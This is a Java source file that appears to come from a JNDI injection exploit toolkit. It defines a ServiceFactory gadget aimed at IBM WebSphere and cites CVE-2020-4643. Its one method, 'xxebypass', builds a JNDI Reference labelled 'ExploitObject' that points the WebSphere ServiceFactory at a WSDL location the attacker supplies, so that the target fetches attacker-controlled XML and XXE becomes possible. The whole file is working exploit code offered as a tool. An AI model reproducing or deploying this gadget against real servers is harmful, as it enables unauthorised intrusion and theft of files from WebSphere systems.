package sonomon.jndi.factory;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class ServiceFactory {
	//ibm WebSphere
	//CVE-2020-4643
	static String factory = "com.ibm.ws.webservices.engine.client.ServiceFactory";
	
	public static Reference xxebypass(String wsdl) throws Exception {
		Reference ref = new Reference("ExploitObject", factory, null);
		ref.add(new StringRefAddr("WSDL location", wsdl));
		ref.add(new StringRefAddr("service namespace", "xxx"));
		ref.add(new StringRefAddr("service local part", "yyy"));
        return ref;
	}
	
	
	
}
